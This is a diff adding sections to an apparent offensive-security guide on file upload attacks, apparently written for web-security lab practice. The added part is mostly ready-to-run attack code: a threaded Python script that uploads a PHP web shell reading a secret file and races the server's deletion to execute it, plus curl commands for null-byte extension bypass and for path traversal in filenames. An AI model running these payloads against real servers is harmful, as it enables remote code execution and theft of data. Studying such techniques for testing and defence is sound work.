@@ -103,6 +103,84 @@ Upload surfaces are high risk: server-side execution (RCE), stored XSS, malware 
 - Request file immediately after upload but before AV/CDR completes
 - Trigger heavy conversions (large images, deep PDFs) to widen race windows
 
+### Race Condition File Upload (Practitioner Critical)
+
+Server uploads the file, validates it, then deletes it if invalid. Exploit the window between upload and deletion:
+
+```python
+#!/usr/bin/env python3
+"""Upload web shell and race to execute it before server deletes it."""
+import requests, threading, time
+
+TARGET = "https://TARGET"
+COOKIE = "session=YOUR_SESSION"
+
+def upload_shell():
+    """Upload PHP web shell."""
+    files = {"avatar": ("shell.php", "<?php echo file_get_contents('/home/carlos/secret'); ?>", "application/x-php")}
+    data = {"user": "wiener", "csrf": "TOKEN"}
+    requests.post(f"{TARGET}/my-account/avatar", files=files, data=data, 
+                  cookies={"session": COOKIE}, verify=False)
+
+def request_shell():
+    """Try to access the uploaded shell before deletion."""
+    r = requests.get(f"{TARGET}/files/avatars/shell.php", 
+                     cookies={"session": COOKIE}, verify=False)
+    if r.status_code == 200 and len(r.text) > 0 and "404" not in r.text:
+        print(f"[SUCCESS] {r.text}")
+        return True
+    return False
+
+# Race: upload and request simultaneously, repeat until success
+for attempt in range(50):
+    t1 = threading.Thread(target=upload_shell)
+    t1.start()
+    time.sleep(0.01)  # Tiny delay to let upload start
+    
+    for _ in range(5):
+        if request_shell():
+            print(f"Succeeded on attempt {attempt}")
+            exit(0)
+        time.sleep(0.01)
+    t1.join()
+
+print("Race failed after all attempts — try adjusting timing")
+```
+
+### Null Byte Extension Bypass
+
+On legacy stacks (older PHP, some Java), null bytes truncate the filename:
+
+```bash
+# Upload payload — server sees .jpg extension, but filesystem truncates at %00
+curl -sk "$TARGET/upload" -X POST \
+  -F "file=@shell.php;filename=shell.php%00.jpg" \
+  -H "Cookie: session=$COOKIE"
+
+# URL-encoded null byte
+curl -sk "$TARGET/upload" -X POST \
+  -F "file=@shell.php;filename=shell.php\x00.jpg" \
+  -H "Cookie: session=$COOKIE"
+```
+
+### Path Traversal in Filename (Content-Disposition)
+
+```bash
+# Override upload directory via directory traversal in filename
+curl -sk "$TARGET/upload" -X POST \
+  -F 'file=@shell.php;filename=..%2fshell.php' \
+  -H "Cookie: session=$COOKIE"
+
+# Double-encode if single encoding is stripped
+curl -sk "$TARGET/upload" -X POST \
+  -F 'file=@shell.php;filename=..%252f..%252fshell.php' \
+  -H "Cookie: session=$COOKIE"
+
+# With Content-Disposition manipulation
+# Modify the multipart body manually:
+# Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
+```
+
 ### Metadata Abuse
 
 - Oversized EXIF/XMP/IPTC blocks to trigger parser flaws
